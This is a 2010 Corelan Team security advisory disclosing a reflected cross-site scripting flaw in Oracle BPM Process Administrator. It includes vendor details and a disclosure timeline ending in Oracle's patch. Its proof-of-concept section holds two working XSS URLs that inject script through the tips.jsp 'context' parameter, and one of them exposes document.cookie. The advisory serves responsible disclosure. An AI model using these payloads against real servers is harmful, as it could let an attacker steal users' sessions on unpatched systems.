@@ -1,0 +1,53 @@
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+
+# Software       : ORACLE Business Process Management (Process Administrator)
+# Author          : Markot
+# Date             : July 15, 2010
+# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-057
+# OS               : Windows
+# Tested on     : Windows Server 2003 SP2 EN + BPM 5.7
+# Type of vuln  : XSS
+# Greetz to      : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+0x00 : Vulnerability information
+ Product : ORACLE Business Process Management Process Administrator
+ Version :  5.7-6.0-10.3 +MP's
+ Vendor :  ORACLE
+ URL :  http://www.oracle.com/technology/software/products/bpm/index.html
+ PATCH URL :  http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html
+
+0x01 : Vendor description of software
+ From the vendor website: "Process Administrator is the AquaLogic BPM Enterprise component which you use to manage the process execution environment. Process Administrator is a Web-based application which you can run from any Web browser with access to the Process Administrator Web application. With Process Administrator you can manage organization elements, control process execution engines, publish projects, connect to external resources, and monitor processes."
+
+0x02 : Vulnerability details
+
+"The discovered vulnerability allows an attacker to send a type of malicious exploit crafted specifically for "Process Administrator"  whereby the target user could be tricked into executing unauthorized commands or actions."
+
+0x03 : Proof of Concept
+http://server:8585/webconsole/faces/faces/faces/jsf/tips.jsp?context=<script>alert(document.cookie)</script>
+http://server:8585/webconsole/faces/faces/faces/jsf/tips.jsp?context=<script>alert('CorelanTeam')</script>
+
+0x04 : Author/Vendor communication
+ April 3 2010 : Oracle Security contacted
+ April 6 2010 : received 1st reply from Oracle Security
+ April 23 2010: received 2nd reply from Oracle Security (track this issue as 17155661)
+ April 27 2010: received first monthly status report for organization CORELAN TEAM
+ May   24 2010: received second monthly status report
+ June  25 2010: received third monthly status report
+ July  9  2010: Received  confirmation that the issue is fixed in the upcoming Critical Patch Update (13 july 2010)
